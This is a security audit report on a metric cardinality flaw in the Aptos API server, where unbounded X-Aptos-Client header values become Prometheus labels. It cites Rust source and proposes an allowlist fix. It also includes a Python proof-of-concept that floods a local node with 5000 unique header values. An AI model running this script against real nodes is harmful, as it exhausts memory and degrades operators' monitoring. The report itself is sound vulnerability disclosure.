# Audit Report

## Title
Prometheus Metric Label Cardinality Explosion via Unbounded X-Aptos-Client Header

## Summary
The API server's `REQUEST_SOURCE_CLIENT` metric uses user-controlled header values as Prometheus labels without bounding cardinality, enabling attackers to cause memory exhaustion through metric explosion.

## Finding Description

The vulnerability exists in how the API server processes the `X-Aptos-Client` HTTP header for metrics collection. [1](#0-0) 

The metric is recorded during request processing via middleware: [2](#0-1) 

The header value is validated using a regex pattern that accepts unbounded variations: [3](#0-2) 

The validation function extracts matching patterns without limiting cardinality: [4](#0-3) 

The regex `aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+` matches an unbounded set of strings. An attacker can send requests with unique `X-Aptos-Client` values like:
- `aptos-sdk-a/1.0.0`
- `aptos-sdk-b/1.0.0` 
- `aptos-sdk-c/1.0.0`
- ... (infinitely many variations)

Each unique label combination creates a new Prometheus time series, consuming memory. While the system monitors for families exceeding 2000 dimensions and logs warnings: [5](#0-4) 

This monitoring is passive and does not prevent or limit the cardinality explosion.

## Impact Explanation

This qualifies as **Medium severity** under "State inconsistencies requiring intervention" because:

1. **Resource Exhaustion**: Unbounded metric cardinality causes linear memory growth in Prometheus, eventually requiring operator intervention to restart services or prune metrics
2. **Monitoring Degradation**: Prometheus query performance degrades with high cardinality, impacting the ability to detect and respond to actual security incidents
3. **Gradual Availability Impact**: While not immediate, sustained attack can lead to API node memory exhaustion and potential crashes

The attack does not directly affect consensus, execution, or state, keeping it below High/Critical severity. However, it requires manual intervention and degrades operational security capabilities.

## Likelihood Explanation

**High likelihood** of occurrence because:
- No authentication required to send arbitrary header values
- Existing rate limiting is IP-based, not per-unique-header-value based
- An attacker within rate limits can generate thousands of unique label combinations per day
- The regex validation accepts any alphabetic identifier and version string
- No mechanism exists to deduplicate or bound the label space

## Recommendation

Implement label cardinality limiting by maintaining a bounded set of known client identifiers:

```rust
use std::collections::HashSet;
use once_cell::sync::Lazy;

static KNOWN_CLIENTS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    ["aptos-sdk-typescript", "aptos-sdk-python", "aptos-sdk-rust", "aptos-cli"]
        .iter().copied().collect()
});

fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };
    
    // Extract just the client identifier (without version)
    match REQUEST_SOURCE_CLIENT_REGEX.find(aptos_client) {
        Some(capture) => {
            let full_match = capture.as_str();
            let identifier = full_match.split('/').next().unwrap_or(REQUEST_SOURCE_CLIENT_UNKNOWN);
            
            // Only use known clients, otherwise bucket as "unknown"
            if KNOWN_CLIENTS.contains(identifier) {
                identifier
            } else {
                REQUEST_SOURCE_CLIENT_UNKNOWN
            }
        },
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

This bounds cardinality to a fixed set of known clients while preserving observability for legitimate SDKs.

## Proof of Concept

```python
#!/usr/bin/env python3
import requests
import string
import itertools

API_URL = "http://localhost:8080/v1"

# Generate unique client identifiers
def generate_clients():
    for combo in itertools.product(string.ascii_lowercase, repeat=3):
        yield f"aptos-sdk-{''.join(combo)}/1.0.0"

# Send requests with unique client headers
print("[*] Starting metric cardinality explosion attack...")
for i, client in enumerate(generate_clients()):
    if i >= 5000:  # Send 5000 unique values
        break
    
    headers = {"X-Aptos-Client": client}
    try:
        response = requests.get(f"{API_URL}", headers=headers, timeout=5)
        if i % 100 == 0:
            print(f"[+] Sent {i} requests with unique client headers")
    except Exception as e:
        print(f"[-] Error: {e}")
        continue

print("[*] Attack complete. Check Prometheus metrics for 'aptos_api_request_source_client'")
print("[*] Query: count(aptos_api_request_source_client)")
```

After running this script, query Prometheus:
```promql
count(aptos_api_request_source_client)
```

The result will show thousands of unique time series, with memory usage growing proportionally.

---

**Notes**

This vulnerability is specific to the API metrics implementation and does not affect core blockchain consensus, execution, or state management. The impact is limited to observability infrastructure, but qualifies as Medium severity due to resource exhaustion potential and operational impact requiring intervention.

### Citations

**File:** api/src/metrics.rs (L61-68)
```rust
pub static REQUEST_SOURCE_CLIENT: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_api_request_source_client",
        "API requests grouped by source (e.g. which SDK, unknown, etc), operation_id, and status",
        &["request_source_client", "operation_id", "status"]
    )
    .unwrap()
});
```

**File:** api/src/log.rs (L21-22)
```rust
static REQUEST_SOURCE_CLIENT_REGEX: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+").unwrap());
```

**File:** api/src/log.rs (L124-130)
```rust
    REQUEST_SOURCE_CLIENT
        .with_label_values(&[
            determine_request_source_client(&log.aptos_client),
            operation_id,
            log.status.to_string().as_str(),
        ])
        .inc();
```

**File:** api/src/log.rs (L148-162)
```rust
fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    // If the header is not set we can't determine the request source.
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    // If there were no matches, we can't determine the request source. If there are
    // multiple matches for some reason, instead of logging nothing, we use whatever
    // value we matched on last.
    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => capture.as_str(),
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L56-68)
```rust
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
```
